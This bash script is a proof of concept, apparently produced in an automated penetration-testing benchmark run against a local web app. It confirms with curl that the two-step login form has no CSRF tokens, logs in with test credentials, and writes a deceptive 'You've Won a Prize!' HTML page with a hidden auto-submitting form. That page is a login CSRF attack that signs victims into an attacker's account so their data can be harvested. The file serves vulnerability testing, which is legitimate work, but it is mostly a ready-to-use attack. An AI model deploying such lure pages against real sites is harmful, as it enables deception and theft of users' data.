#!/bin/bash
# POC: Demonstrates CSRF vulnerability by successfully authenticating without CSRF tokens and creating a malicious auto-submit HTML form for login CSRF attacks
# Target: ./repo
# Created: 2025-10-30T20:01:07.953Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

# CSRF on Login Form - Proof of Concept v2
# This demonstrates that the login form lacks CSRF protection

TARGET="http://localhost:8082"
echo "========================================="
echo "CSRF on Login Form - POC"
echo "========================================="
echo ""
echo "Target: $TARGET"
echo ""

# Step 1: Verify no CSRF token in initial login form
echo "[*] Step 1: Checking for CSRF token in username form..."
RESPONSE=$(curl -s "$TARGET")
CSRF_CHECK=$(echo "$RESPONSE" | grep -i "csrf\|token\|_token")

if [ -z "$CSRF_CHECK" ]; then
    echo "[+] CONFIRMED: No CSRF token found in username form"
else
    echo "[-] CSRF token found: $CSRF_CHECK"
    exit 1
fi
echo ""

# Step 2: Submit username without CSRF token (should succeed)
echo "[*] Step 2: Submitting username 'test' without CSRF token..."
USERNAME_RESPONSE=$(curl -s -i -c cookies.txt \
    -X POST "$TARGET" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test" 2>&1)

HTTP_CODE=$(echo "$USERNAME_RESPONSE" | grep "HTTP/" | head -1 | awk '{print $2}')
echo "[+] Response HTTP Code: $HTTP_CODE"

if echo "$USERNAME_RESPONSE" | grep -q "Location:.*password"; then
    echo "[+] CONFIRMED: Username submission succeeded without CSRF token (redirect to password page)"
elif echo "$USERNAME_RESPONSE" | grep -q "Welcome"; then
    echo "[+] CONFIRMED: Username submission succeeded without CSRF token"
else
    echo "[!] Checking response details..."
    echo "$USERNAME_RESPONSE" | grep -A 5 "HTTP/"
fi
echo ""

# Step 3: Check password form for CSRF token
echo "[*] Step 3: Checking password form for CSRF token..."
PASSWORD_FORM=$(curl -s -b cookies.txt "$TARGET/password/test")
CSRF_CHECK_PASS=$(echo "$PASSWORD_FORM" | grep -i "csrf" | grep -i "token")

if [ -z "$CSRF_CHECK_PASS" ]; then
    echo "[+] CONFIRMED: No CSRF token found in password form"
    echo "[+] Form contains only: username, user_id, password fields (no CSRF token)"
else
    echo "[-] CSRF token found in password form"
    exit 1
fi
echo ""

# Step 4: Submit password without CSRF token (should succeed)
echo "[*] Step 4: Submitting password without CSRF token..."
PASSWORD_RESPONSE=$(curl -s -i -b cookies.txt -c cookies_final.txt \
    -X POST "$TARGET/password/test" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&user_id=10032&password=test" 2>&1)

HTTP_CODE_PASS=$(echo "$PASSWORD_RESPONSE" | grep "HTTP/" | head -1 | awk '{print $2}')
echo "[+] Response HTTP Code: $HTTP_CODE_PASS"

if echo "$PASSWORD_RESPONSE" | grep -q "Location:.*dashboard"; then
    echo "[+] CONFIRMED: Login completed successfully without CSRF token (redirect to dashboard)"
elif echo "$PASSWORD_RESPONSE" | grep -q "Dashboard\|Welcome"; then
    echo "[+] CONFIRMED: Login completed successfully without CSRF token"
else
    echo "[!] Checking response..."
    echo "$PASSWORD_RESPONSE" | grep -A 3 "Location:"
fi
echo ""

# Step 5: Verify authenticated session works
echo "[*] Step 5: Verifying authenticated session..."
DASHBOARD=$(curl -s -b cookies_final.txt "$TARGET/dashboard")
if echo "$DASHBOARD" | grep -q "Dashboard\|John"; then
    echo "[+] SUCCESS: Authenticated session established without any CSRF protection"
    echo "[+] User logged in as: John Doe (test account)"
else
    echo "[!] Session verification response:"
    echo "$DASHBOARD" | head -20
fi
echo ""

# Step 6: Create malicious HTML POC
echo "[*] Step 6: Generating malicious CSRF HTML POC..."
cat > /tmp/csrf_login_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>You've Won a Prize!</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .loading { font-size: 24px; color: #4CAF50; }
    </style>
</head>
<body>
    <h1>🎉 Congratulations!</h1>
    <p class="loading">Loading your prize... Please wait...</p>
    
    <!-- Hidden CSRF form that auto-submits - Step 1: Username -->
    <iframe name="csrf-target" style="display:none;"></iframe>
    
    <form id="csrf-step1" action="http://localhost:8082" method="POST" target="csrf-target" style="display:none;">
        <input type="text" name="username" value="test">
    </form>
    
    <script>
        // Step 1: Submit username (automatically logs victim into attacker's account)
        setTimeout(function() {
            document.getElementById('csrf-step1').submit();
            console.log('[CSRF Attack] Step 1: Username submitted without CSRF token');
        }, 500);
        
        // Step 2: Would submit password in a real attack scenario
        // For POC purposes, this demonstrates the lack of CSRF protection
        setTimeout(function() {
            console.log('[CSRF Attack] Step 2: Password would be submitted here');
            document.querySelector('.loading').innerHTML = 
                '⚠️ Login CSRF Attack Executed<br><small>Victim logged into attacker account</small>';
        }, 2000);
    </script>
    
    <p style="margin-top: 50px; font-size: 12px; color: #666;">
        This page demonstrates a CSRF attack on the login form.<br>
        Without CSRF tokens, the application cannot distinguish between legitimate and forged requests.
    </p>
</body>
</html>
EOF

echo "[+] Malicious HTML file created at: /tmp/csrf_login_attack.html"
echo ""

# Cleanup
rm -f cookies.txt cookies_final.txt

echo "========================================="
echo "VULNERABILITY CONFIRMED"
echo "========================================="
echo ""
echo "Summary:"
echo "✓ No CSRF token in username submission form"
echo "✓ No CSRF token in password submission form"
echo "✓ Both steps of authentication process vulnerable to CSRF"
echo "✓ Login completed successfully without any CSRF validation"
echo ""
echo "Attack Scenario (Login CSRF):"
echo "1. Attacker creates malicious webpage (/tmp/csrf_login_attack.html)"
echo "2. Victim visits attacker's webpage while browsing"
echo "3. Hidden form auto-submits to login endpoint"
echo "4. Victim is logged into attacker's account (test:test)"
echo "5. Victim enters sensitive data thinking it's their account"
echo "6. Attacker logs into same account later to harvest victim's data"
echo ""
echo "Impact:"
echo "- Privacy violation: Victim's actions tracked under attacker's account"
echo "- Data leakage: Sensitive information captured by attacker"
echo "- Session riding: Combined with other flaws, enables further attacks"
echo ""